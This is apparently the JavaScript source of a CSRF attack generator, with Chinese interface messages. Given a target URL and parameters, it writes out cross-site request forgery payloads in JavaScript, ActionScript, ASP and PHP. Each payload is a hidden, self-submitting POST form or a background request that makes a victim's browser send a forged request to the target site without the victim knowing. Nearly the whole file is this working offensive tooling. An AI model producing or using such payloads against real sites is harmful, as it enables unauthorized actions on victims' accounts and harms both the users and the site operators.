// by cosine
function _g(x){return document.getElementById(x)}	
function _sys_tip(content,delay){
	_g("sys_tip").innerHTML = content;
	_g("sys_tip").style.display = "block";
	setTimeout("_g('sys_tip').style.display = 'none'",delay);
}

csrf_codz = {};
csrf_codz.lib = function(){
	csrf_type = _g("csrftype").value;
	csrf_url = _g("csrfurl").value;
	csrf_value = _g("csrfvalue").value
	if(csrf_type == "null"){
		_sys_tip("请选择CSRF类型...",3000);
		return;
	}
	if(csrf_url == ""){
		_sys_tip("请输入URL...",3000);
		return;
	}
	if(csrf_value == ""){
		_sys_tip("请输入参数值...",3000);
		return;
	}
	if(csrf_type == 0){
		_g("csrf_textarea").value = csrf_url + "?" + csrf_value;
	}else{
		csrf_lang = _g("csrflang").value;
		if(csrf_lang == "null"){
			_sys_tip("请选择生成CSRF代码使用的语言...",3000);
			return;
		}
		
		switch(csrf_lang){
			case "js":
				_js = "function new_form(){\n";
				_js += "	var f = document.createElement(\"form\");\n";
				_js += "	document.body.appendChild(f);\n";
				_js += "	f.method = \"post\";\n";
				_js += "	return f;\n";
				_js += "}\n";
				_js += "function create_elements(eForm, eName, eValue){\n";
				_js += "	var e = document.createElement(\"input\");\n";
				_js += "	eForm.appendChild(e);\n";
				_js += "	e.type = \'text\';\n";
				_js += "	e.name = eName;\n";
				_js += "	if(!document.all){e.style.display = \'none\';}else{\n";
				_js += "		e.style.display = \'block\';\n";
				_js += "		e.style.width = \'0px\';\n";
				_js += "		e.style.height = \'0px\';\n";
				_js += "	}\n";
				_js += "	e.value = eValue;\n";
				_js += "	return e;\n";
				_js += "}\n";
				_js += "var _f = new_form();\n";
				js_args = csrf_value.split("&");
				for(i=0; i<js_args.length; i++){
					js_arg = js_args[i].split("=");
					_js += "create_elements(_f, \"" + js_arg[0] + "\", \"" + js_arg[1] + "\");\n";
				}
				_js += "_f.action= \"" + csrf_url + "\";\n";
				_js += "_f.submit();\n";
				_g("csrf_textarea").value = _js;
				break;
			case "as":
				as_args = csrf_value.split("&");
				_as = "import flash.net.URLRequest;\n";
				_as += "var url = new URLRequest(\"" + csrf_url + "\");\n";
				_as += "var _v = new URLVariables();\n";
				_as += "_v = \"";
				for(i=0; i<as_args.length; i++){
					as_arg = as_args[i].split("=");
					if(i == as_args.length-1){_as += as_arg[0] + "=" + as_arg[1] + "\";\n"}else{
						_as += as_arg[0] + "=" + as_arg[1] + "&";
					}
				}
				_as += "url.method = \"POST\";\n";
				_as += "url.data = _v;\n";
				_as += "sendToURL(url);\n";
				_g("csrf_textarea").value = _as;
				break;
			case "asp":
				asp_args = csrf_value.split("&");
				_asp = "<%\n";
				_asp += "s = \"<form method=\'post\' action=\'" + csrf_url + "\'>\"\n";
				for(i=0; i<asp_args.length; i++){
					asp_arg = asp_args[i].split("=");
					_asp += "s = s+\"<input type=\'text\' value=\'" + asp_arg[1] + "\' name=\'" + asp_arg[0] + "\' style=\'display:none!important;display:block;width=0;height=0\' \/>\"\n";
				}
				_asp += "s = s+\"<\/form>\"\n";
				_asp += "s = s+\"<script>document.forms[0].submit();<\/script>\"\n";
				_asp += "response.write(s)\n";
				_asp += "%>\n";
				_g("csrf_textarea").value = _asp;
				break;
			case "php":
				php_args = csrf_value.split("&");
				_php = "<?php\n";
				_php += "$s = \"<form method=\'post\' action=\'" + csrf_url + "\'>\";\n";
				for(i=0; i<php_args.length; i++){
					php_arg = php_args[i].split("=");
					_php += "$s = $s.\"<input type=\'text\' value=\'" + php_arg[1] + "\' name=\'" + php_arg[0] + "\' style=\'display:none!important;display:block;width=0;height=0\' \/>\";\n";
				}
				_php += "$s = $s.\"<\/form>\";\n";
				_php += "$s = $s.\"<script>document.forms[0].submit();<\/script>\";\n";
				_php += "echo($s);\n";
				_php += "?>\n";
				_php += "\n";
				_g("csrf_textarea").value = _php;
				break;
			case "py":
				_g("csrf_textarea").value = 'null';
				break;
		}
	}
}

